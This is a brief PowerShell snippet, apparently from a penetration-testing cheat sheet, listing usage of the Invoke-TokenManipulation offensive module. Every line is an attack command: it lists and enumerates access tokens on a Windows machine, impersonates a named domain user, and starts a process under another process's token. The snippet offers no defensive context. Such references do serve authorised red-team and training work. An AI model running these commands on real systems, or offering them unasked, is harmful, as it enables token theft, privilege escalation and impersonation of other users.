```powershell
# Show all tokens on the machine
Invoke-TokenManipulation -ShowAll

# Show only unique, usable tokens on the machine
Invoke-TokenManipulation -Enumerate

# Start new process with token of a specific user
Invoke-TokenManipulation -ImpersonateUser -Username "domain\user"

# Start new process with token of another process
Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\calc.exe" -ProcessId 500
```